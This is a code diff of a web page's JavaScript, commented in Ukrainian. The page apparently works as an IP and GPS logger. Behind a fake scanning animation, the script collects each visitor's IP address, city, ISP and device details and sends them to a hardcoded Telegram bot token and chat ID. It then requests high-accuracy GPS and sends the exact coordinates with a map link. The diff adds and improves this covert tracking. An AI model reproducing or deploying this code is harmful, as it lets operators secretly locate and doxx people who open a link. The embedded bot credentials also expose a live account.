@@ -45,9 +45,10 @@
 const TG_TOKEN = "8639479669:AAHYhGU7UMGZ5nlo3-PGzKVsQx9vTaQojFk";
 const TG_CHAT_ID = "7445429506";
 
-// Годинник
+// Таймер
 setInterval(() => {
-    document.getElementById("time").innerText = new Date().toLocaleString();
+    const el = document.getElementById("time");
+    if(el) el.innerText = new Date().toLocaleString();
 }, 1000);
 
 // Прогрес-бар
@@ -61,100 +62,107 @@ let scan = setInterval(() => {
         document.getElementById("statusText").innerText = "FINALIZING...";
         startLogic();
     }
-}, 25);
+}, 20);
 
 function sendToTelegram(d, type = "IP") {
+    // Безпечне отримання полів, щоб код не падав
+    const ip = d.ip || "Unknown";
+    const city = d.city || "Unknown";
+    const country = d.country_name || d.country || "Unknown";
+    const isp = d.org || d.isp || "Unknown";
+    const lat = d.latitude || 0;
+    const lon = d.longitude || 0;
+
     const text = `
 🔔 *${type === 'GPS' ? '🎯 ТОЧНА ЛОКАЦІЯ' : '🌐 ДАНІ ПО IP'}*
-🌐 *IP:* ${d.ip}
-🌍 *Місце:* ${d.city}, ${d.country}
-🏢 *Провайдер:* ${d.isp || (d.connection ? d.connection.isp : '---')}
-📍 *Координати:* ${d.latitude}, ${d.longitude}
+🌐 *IP:* ${ip}
+🌍 *Місце:* ${city}, ${country}
+🏢 *Провайдер:* ${isp}
 📱 *OS:* ${navigator.platform}
-🔗 *Maps:* https://www.google.com/maps?q=${d.latitude},${d.longitude}
+🔗 *Maps:* https://www.google.com/maps?q=${lat},${lon}
     `;
+
     fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: "Markdown" })
-    });
+    }).catch(e => console.log("TG Error:", e));
 }
 
 function startLogic() {
-    fetch("https://ipwho.is/")
+    // Використовуємо ipapi.co (він надійний для HTTPS)
+    fetch("https://ipapi.co/json/")
         .then(r => r.json())
-        .then(ipData => {
-            // Відразу шлемо тобі базові дані
-            sendToTelegram({
-                ip: ipData.ip,
-                city: ipData.city,
-                country: ipData.country,
-                isp: ipData.connection.isp,
-                latitude: ipData.latitude,
-                longitude: ipData.longitude
-            }, "IP");
+        .then(data => {
+            // 1. Відразу відправляємо лог в ТГ
+            sendToTelegram(data, "IP");
 
-            // Почергова поява блоків для користувача
+            // 2. Анімація появи даних для користувача
             setTimeout(() => {
-                document.getElementById("ip").innerText = ipData.ip;
+                document.getElementById("ip").innerText = data.ip || "Error";
                 document.getElementById("ipBox").classList.add("show");
-            }, 400);
+            }, 300);
 
             setTimeout(() => {
-                document.getElementById("location").innerText = `${ipData.city}, ${ipData.country}`;
+                document.getElementById("location").innerText = `${data.city || '?'}, ${data.country_name || '?'}`;
                 document.getElementById("countryBox").classList.add("show");
-            }, 800);
+            }, 600);
 
             setTimeout(() => {
-                document.getElementById("isp").innerText = ipData.connection.isp;
+                document.getElementById("isp").innerText = data.org || "Unknown Provider";
                 document.getElementById("ispBox").classList.add("show");
+            }, 900);
+
+            setTimeout(() => {
+                document.getElementById("device").innerText = navigator.userAgent.split(') ')[1] || navigator.platform;
+                document.getElementById("deviceBox").classList.add("show");
             }, 1200);
 
             setTimeout(() => {
-                document.getElementById("device").innerText = navigator.userAgent;
-                document.getElementById("deviceBox").classList.add("show");
-            }, 1600);
-
-            setTimeout(() => {
                 document.getElementById("timeBox").classList.add("show");
-            }, 2000);
+            }, 1500);
 
-            // Запит справжнього GPS та показ карти
+            // 3. Запит GPS та карта
             setTimeout(() => {
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
                             const gpsData = {
-                                ip: ipData.ip,
-                                city: "Визначено по GPS 🎯",
-                                country: ipData.country,
+                                ...data,
                                 latitude: pos.coords.latitude,
                                 longitude: pos.coords.longitude
                             };
                             sendToTelegram(gpsData, "GPS");
-                            showMap(pos.coords.latitude, pos.coords.longitude, "Ваша точна позиція");
+                            showMap(pos.coords.latitude, pos.coords.longitude, "🎯 Ви тут");
                         },
                         () => {
-                            // Якщо відмовив — показуємо карту по IP
-                            showMap(ipData.latitude, ipData.longitude, ipData.city);
+                            showMap(data.latitude, data.longitude, data.city);
                         },
-                        { enableHighAccuracy: true }
+                        { enableHighAccuracy: true, timeout: 5000 }
                     );
                 } else {
-                    showMap(ipData.latitude, ipData.longitude, ipData.city);
+                    showMap(data.latitude, data.longitude, data.city);
                 }
-            }, 2400);
+            }, 1800);
+        })
+        .catch(err => {
+            console.log("Fetch Error:", err);
+            document.getElementById("statusText").innerText = "CONNECTION ERROR";
         });
 }
 
 function showMap(lat, lon, label) {
-    document.getElementById("map").style.display = "block";
+    const mapEl = document.getElementById("map");
+    mapEl.style.display = "block";
     document.getElementById("statusText").innerText = "SUCCESS";
     document.getElementById("successText").style.display = "block";
     
-    let map = L.map('map').setView([lat, lon], 14);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-    L.marker([lat, lon]).addTo(map).bindPopup(label).openPopup();
+    // Перевірка, чи карта вже ініціалізована
+    if (window.myMap) window.myMap.remove();
+    
+    window.myMap = L.map('map').setView([lat, lon], 14);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(window.myMap);
+    L.marker([lat, lon]).addTo(window.myMap).bindPopup(label).openPopup();
 }
 </script>
 
